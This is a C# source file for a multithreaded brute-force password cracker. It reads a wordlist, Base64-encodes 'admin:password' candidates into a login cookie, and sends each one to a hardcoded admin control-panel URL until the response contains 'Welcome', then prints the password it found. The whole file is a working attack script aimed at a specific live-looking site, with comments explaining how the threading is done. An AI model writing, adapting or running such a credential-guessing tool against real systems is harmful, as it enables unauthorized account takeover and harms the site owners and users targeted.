using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.IO;
namespace BruteForce
{
    class BruteForce
    {
        static List<string> passList = new List<string>();
        static string user = "admin";
        static string password = "Didn't get the passowrd! :'("; //This should be the correct password to be printed
        static EventWaitHandle handle = new AutoResetEvent(false);
        static int id = 0; //For checking loop.. see Method:CheckPass
        static void Main(string[] args)
        {
            string pass = ""; 
            int numThreads = 10;
            Thread[] threads = new Thread[numThreads];
            StreamReader file = new StreamReader("c:\\passList.txt");
            while ((pass = file.ReadLine()) != null)
                passList.Add(pass);
            file.Close();
            
            //Let each Thread do method CheckPass
            for (int i= 0; i < numThreads; i++)
            {
                ThreadStart start = new ThreadStart(CheckPass); 
                threads[i] = new Thread(start);
                threads[i].Start();
            }
            handle.WaitOne(); //wait for a thread to find the correct passowrd
            
            //closing threads
            foreach (Thread thread in threads)
                thread.Abort();
            Console.WriteLine("\n\nPassword is: " + password);
            Console.Read();
        }
        
        public static void CheckPass()
        {
            /* The (id) is shared in all threads, so threads go through the list line by line
             * I did it like this (increment the id after taking string pass from the list)
             * because if it increment before all threads will start with the first line then 
             * they will go through the list correctly.
             * Try it and you will understand (put the id increment inside the FOR loop)
             */
            for(; id < passList.Count; )
            {
                string pass = passList[id];
                id++;
                // The next line to decode the user (admin) and password to Base64 which is the cookies encryption method
                string encoded = Connect(Convert.ToBase64String(Encoding.ASCII.GetBytes(user + ":" + pass)));
                if (encoded.Contains("Welcome"))
                {
                    password = pass;
                    handle.Set(); //Tell the thread waiting (main thread) to continue
                    break;
                }
                Console.WriteLine(pass); //Write the password which has tried
            }
        }
        
        public static string Connect(string cookieValue)
        {
            //Login url
            string url = @"http://www.dark0day.com/cp/index.php?do=login";
            // Create request with cookies (admin:PASS) Base64
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.CookieContainer = new CookieContainer();
            Cookie cookie = new Cookie("login", cookieValue);
            request.CookieContainer.Add(new Uri(url), cookie);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            var encoding = ASCIIEncoding.ASCII;  //I was using it for a reason, and I forgot to delet it :(
            StreamReader reader = new StreamReader(response.GetResponseStream());
            return reader.ReadToEnd();
        }
    }
}
